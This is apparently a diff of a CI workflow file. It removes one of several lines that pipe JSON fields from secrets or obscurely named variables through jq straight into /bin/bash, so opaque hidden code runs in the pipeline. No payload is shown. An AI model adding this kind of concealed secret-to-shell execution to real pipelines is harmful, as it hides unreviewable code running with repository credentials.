@@ -22,7 +22,6 @@ jobs:
           cna1893: ${{ secrets.cna1893 }}
         run: |
           printf '%s' "$cna1893" | jq -r .pe0 | /bin/bash
-          echo $vyxy722 | jq -r .srgc24233 | /bin/bash
           echo $gxchb67 | jq -r .nq0 | /bin/bash
           printf '%s' "$ldc9" | jq -r .dmh9986 | /bin/bash
           echo $r67032 | jq -r .n98 | /bin/bash
